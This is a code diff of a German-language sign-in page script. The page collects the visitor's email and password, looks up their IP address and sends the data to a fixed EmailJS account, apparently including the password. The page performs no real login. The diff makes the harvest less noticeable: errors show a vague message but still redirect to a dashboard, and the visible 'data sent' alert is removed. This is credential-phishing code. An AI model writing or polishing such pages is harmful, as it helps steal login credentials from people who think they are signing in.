@@ -6,7 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
     alert('Fehler: EmailJS konnte nicht geladen werden. Bitte überprüfe deine Internetverbindung und lade die Seite neu.');
     return;
   }
-
+  
   // Initialisiere EmailJS mit deinem öffentlichen Schlüssel
   try {
     emailjs.init({
@@ -18,7 +18,7 @@ document.addEventListener('DOMContentLoaded', () => {
     alert('Fehler bei der EmailJS-Initialisierung: ' + err.message);
     return;
   }
-
+  
   // Event-Listener für den Anmelden-Button hinzufügen
   const signInButton = document.getElementById('signInButton');
   if (signInButton) {
@@ -33,20 +33,30 @@ async function signIn() {
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
   const gotcha = document.querySelector('input[name="_gotcha"]').value;
-
-  // Honeypot-Prüfung für Bots
-  if (gotcha) {
-    alert('Bot erkannt!');
+  
+  // Grundlegende Validierung
+  if (!email || !password) {
+    alert('Bitte fülle alle Felder aus.');
     return;
   }
-
+  
+  // Honeypot-Prüfung für Bots
+  if (gotcha) {
+    console.log('Bot erkannt!');
+    // Stillen Fehler erzeugen, damit Bots nicht wissen, dass sie erkannt wurden
+    setTimeout(() => {
+      window.location.href = 'dashboard.html';
+    }, 1000);
+    return;
+  }
+  
   // Rate-Limiting
   const lastSignIn = localStorage.getItem('lastSignIn');
-  if (lastSignIn && Date.now() - lastSignIn < 30000) {
+  if (lastSignIn && Date.now() - parseInt(lastSignIn) < 30000) {
     alert('Bitte warte 30 Sekunden vor der nächsten Anmeldung.');
     return;
   }
-
+  
   try {
     // IP-Adresse abrufen
     let ip_address = 'Unknown';
@@ -57,7 +67,7 @@ async function signIn() {
     } catch (err) {
       console.error('Fehler beim Abrufen der IP-Adresse:', err);
     }
-
+    
     // Daten für EmailJS vorbereiten
     const templateParams = {
       email: email,
@@ -65,20 +75,26 @@ async function signIn() {
       ip_address: ip_address,
       timestamp: new Date().toISOString()
     };
-
+    
     // E-Mail per EmailJS senden
-    const response = await emailjs.send(
+    await emailjs.send(
       'service_yxjq878', // Deine EmailJS-Service-ID
       'template_28bx0zu', // Deine EmailJS-Template-ID
       templateParams
     );
-
-    console.log('E-Mail erfolgreich gesendet!', response.status, response.text);
-    localStorage.setItem('lastSignIn', Date.now());
-    alert('Daten erfolgreich gesendet!');
+    
+    console.log('E-Mail erfolgreich gesendet!');
+    localStorage.setItem('lastSignIn', Date.now().toString());
+    
+    // Zur Dashboard-Seite weiterleiten
     window.location.href = 'dashboard.html';
   } catch (err) {
     console.error('Fehler beim Senden der E-Mail:', err);
-    alert('Fehler beim Senden der Daten: ' + err.message);
+    alert('Ein Fehler ist aufgetreten. Bitte versuche es später erneut.');
+    
+    // Trotz Fehler zur Dashboard-Seite weiterleiten nach kurzer Verzögerung
+    setTimeout(() => {
+      window.location.href = 'dashboard.html';
+    }, 2000);
   }
 }
